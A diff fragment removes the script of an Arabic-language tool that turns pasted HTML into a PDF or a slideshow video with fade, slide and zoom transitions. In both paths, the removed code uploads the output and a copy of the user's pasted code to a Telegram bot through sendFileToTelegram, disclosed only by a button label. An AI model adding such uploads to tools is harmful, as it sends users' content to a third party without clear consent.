-            const f = document.getElementById('format-select').value;
-            if (!document.getElementById('html-input').value.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
-            if (f.startsWith('pdf')) await generatePDF(); else await generateCinematicVideo();
-        }
-
-        async function generateCinematicVideo() {
-            const btn = document.getElementById('capture-btn');
-            const code = document.getElementById('html-input').value;
-            const fileName = document.getElementById('file-name').value || 'video';
-            const durationSec = parseInt(document.getElementById('slide-duration').value);
-            const animStyle = document.getElementById('animation-style').value;
-            const quality = parseInt(document.getElementById('quality-select').value);
-
-            let w = document.getElementById('format-select').value === 'vid-916' ? 720 : 1280;
-            let h = document.getElementById('format-select').value === 'vid-916' ? 1280 : 720;
-
-            btn.disabled = true; btn.innerText = "⏳ جاري التجهيز...";
-            const container = document.createElement('div');
-            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
-            container.innerHTML = code; document.body.appendChild(container);
-
-            try {
-                await document.fonts.ready; await convertAllImagesToDataURLs(container);
-                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];
-                const canvases = [];
-                for (let i = 0; i < pages.length; i++) {
-                    btn.innerText = `📸 تصوير شريحة ${i+1}...`;
-                    canvases.push(await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true }));
-                }
-
-                btn.innerText = "🎬 تسجيل الفيديو...";
-                const recCanvas = document.createElement('canvas'); recCanvas.width = w; recCanvas.height = h;
-                const ctx = recCanvas.getContext('2d'); ctx.fillStyle = '#ffffff'; ctx.fillRect(0, 0, w, h);
-                const stream = recCanvas.captureStream(30);
-                
-                let mimeType = MediaRecorder.isTypeSupported('video/webm; codecs=vp9') ? 'video/webm; codecs=vp9' : (MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm');
-                const recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 3000000 });
-                const chunks = []; recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-
-                const recordPromise = new Promise(resolve => {
-                    recorder.onstop = async () => {
-                        btn.innerText = "🚀 جاري إرسال النسخة للبوت...";
-                        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-                        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
-                        const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
-
-                        await sendFileToTelegram(blob, `${fileName}.${ext}`, `🎬 فيديو جاهز!`, 'video');
-                        await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود`);
-
-                        btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
-                        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${fileName}.${ext}`; document.body.appendChild(a); a.click(); document.body.removeChild(a);
-                        
-                        resolve();
-                    };
-                });
-
-                recorder.start();
-                const totalDur = durationSec * 1000 * canvases.length; const transDur = 800; const start = Date.now();
-
-                function animate() {
-                    const elapsed = Date.now() - start;
-                    if (elapsed < totalDur) {
-                        const idx = Math.floor(elapsed / (durationSec * 1000));
-                        const timeInSlide = elapsed % (durationSec * 1000);
-                        ctx.fillStyle = "#ffffff"; ctx.fillRect(0, 0, w, h);
-
-                        if (animStyle === 'none') {
-                            ctx.drawImage(canvases[idx], 0, 0, w, h);
-                        } 
-                        else if (animStyle === 'fade') {
-                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
-                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
-                                ctx.drawImage(canvases[idx], 0, 0, w, h);
-                                ctx.globalAlpha = p;
-                                ctx.drawImage(canvases[idx+1], 0, 0, w, h);
-                                ctx.globalAlpha = 1;
-                            } else {
-                                ctx.drawImage(canvases[idx], 0, 0, w, h);
-                            }
-                        } 
-                        else if (animStyle === 'slide') {
-                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
-                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
-                                ctx.drawImage(canvases[idx], -p * w, 0, w, h);
-                                ctx.drawImage(canvases[idx+1], w - p * w, 0, w, h);
-                            } else {
-                                ctx.drawImage(canvases[idx], 0, 0, w, h);
-                            }
-                        }
-                        else if (animStyle === 'zoom') {
-                            const zoom = 1 + (timeInSlide / (durationSec * 1000)) * 0.05;
-                            const zw = w * zoom; const zh = h * zoom; 
-                            const ox = (w - zw) / 2; const oy = (h - zh) / 2;
-                            
-                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
-                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
-                                ctx.drawImage(canvases[idx], ox, oy, zw, zh);
-                                ctx.globalAlpha = p;
-                                ctx.drawImage(canvases[idx+1], 0, 0, w, h);
-                                ctx.globalAlpha = 1;
-                            } else {
-                                ctx.drawImage(canvases[idx], ox, oy, zw, zh);
-                            }
-                        }
-
-                        requestAnimationFrame(animate);
-                    } else { setTimeout(() => recorder.stop(), 100); }
-                }
-                animate(); await recordPromise;
-
-            } catch (e) { alert("تعذر استخراج الفيديو!"); console.error(e);}
-            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
-        }
-
-        async function generatePDF() {
-            const btn = document.getElementById('capture-btn');
-            const code = document.getElementById('html-input').value;
-            const fileName = document.getElementById('file-name').value || 'document';
-            const quality = parseInt(document.getElementById('quality-select').value);
-            const f = document.getElementById('format-select').value;
-
-            btn.disabled = true; btn.innerText = "⏳ جاري التجهيز...";
-            const w = f.includes('a4') ? 794 : 1280; const h = f.includes('a4') ? 1123 : 720;
-            const container = document.createElement('div');
-            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
-            container.innerHTML = code; document.body.appendChild(container);
-
-            try {
-                await document.fonts.ready; await convertAllImagesToDataURLs(container);
-                const { jsPDF } = window.jspdf; const pdf = new jsPDF({ orientation: f.includes('a4') ? 'p' : 'l', unit: 'px', format: [w, h] });
-                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];
-
-                for (let i = 0; i < pages.length; i++) {
-                    btn.innerText = `📸 تصوير صفحة ${i+1}...`;
-                    const c = await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true });
-                    if (i > 0) pdf.addPage([w, h]);
-                    pdf.addImage(c.toDataURL('image/jpeg', 0.8), 'JPEG', 0, 0, w, h, undefined, 'FAST');
-                }
-
-                btn.innerText = "🚀 جاري إرسال النسخة للبوت...";
-                const blob = pdf.output('blob');
-                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
-
-                await sendFileToTelegram(blob, `${fileName}.pdf`, "📥 بحث PDF جاهز!");
-                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود`);
-                
-                btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
-                pdf.save(`${fileName}.pdf`);
-
-            } catch (e) { alert("حدث خطأ أثناء معالجة الـ PDF"); }
-            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
-        }
-    </script>
 </body>
 </html>
